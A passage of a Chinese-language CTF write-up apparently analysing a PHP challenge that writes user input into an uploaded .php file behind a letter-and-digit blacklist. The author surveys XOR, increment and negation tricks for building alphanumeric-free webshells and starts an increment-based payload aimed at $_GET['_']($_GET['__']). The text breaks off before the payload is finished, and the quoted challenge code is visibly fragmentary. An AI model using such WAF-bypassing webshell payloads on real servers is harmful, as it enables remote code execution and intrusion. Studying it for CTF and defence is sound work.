# 前言
这篇文章在写的时候我查阅了许多资料也参考了很多师傅的博客，尽我所能的搞懂这个知识点以及要完成这个操作所需要的相关知识。在搞明白以后，回过头来看，其实也没有当初那样晦涩难懂，只是初学起来会因为知识储备不够而走入思维的误区。  
网上也有很多的相关资料，但我还是想把这篇文章分享出来，并不是因为我总结的有多好，见解有多深刻，而是每个人在遇到这个问题的时候思维不一样，知识储备不一样，走入的误区也不一样。自己做记录的同时，也希望帮助其他的伙伴。
## 题目代码
    ', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '|', '~');
    foreach ($black_list as $b) {
       if (stripos($data, $b) !== false){
           die("WAF!");
       }
    }
    $filename=rand_string(0x20).'.php';
    $folder='uploads/';
    $full_filename = $folder.$filename;
    if(file_put_contents($full_filename, 'WebShell";
       echo "Enjoy your webshell~";
    }else{
       echo "Some thing wrong...";
    }
**首先对代码逻辑进行分析：**  
本题代码相对来说较多，我选择的方法是先分块后分析，在这里分了四块  
**第一块：**
    ', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '|', '~');
    foreach ($black_list as $b) {
       if (stripos($data, $b) !== false){
           die("WAF!");
       }
    }
把传入c的值赋值给data，检查传入的值是否包含black_list中的字符。换句话说，第三块设置了一个WAF，过滤其中的字符，通过get传入的参数c不能包含其中的字符（不能包含数字字母和一些其他符号），否则将会被拦截。  
**第四块:**
    $filename=rand_string(0x20).'.php';
    $folder='uploads/';
    $full_filename = $folder.$filename;
    if(file_put_contents($full_filename, 'WebShell";
       echo "Enjoy your webshell~";
    }else{
       echo "Some thing wrong...";
    }
设置上传文件的文件名（第二部分生成的随机值）和文件目录，并把传入c的值存入文件中，这一步把我们自己传入的参数写到他自己生成的文件中，就要考虑如何给他往里面写点咱们能利用的东西。
**把这四块合起来说：**
  * 我们要以get的形式传入一个参数c，参数c的值不能是字母数字或是waf中的其他值。
  * 传入的值保存在自动生成的文件目录下的文件夹中，文件名是随机生成的。
分析完代码逻辑发现，接下来最主要的问题就是如何绕过限制字符，把我们可以利用的值存入文件中，并成功利用。  
在这里通过查阅资料发现，目前解决不包含字母和数字的webshell大体归为三类：
  * 异或：通过非字母数字进行异或，得到所需字母
  * 自增：通过对php数组与数组或者数组与字符串进行拼接，php会强制转换类型，得到Array，取a进行自增，得到所需字符
  * 取反：利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如'和'{2}的结果是"\x8c"，其取反即为字母s  
源自P牛博客：[传送门](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
在本题中给出的两种payload都是基于第二种方法的，因为题目WAF做了太多的限制，利用自增这个方法比较直观减少盲目。  
**第一种方法：先构造上传文件，在往文件中写一句话（木马）**  
**第一步：得到$ _GET['_ ']($_GET['__'])**
    <?php
    $_=[].[]; //俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray
    $__='';  //两个短杠赋值为空
    $_=$_[''];//从arrayarray中取首字符，即a。这里$_=$_[0]也是一样的道理，不过waf限制数字输入
    $_=++$_; //b
    $_=++$_; //c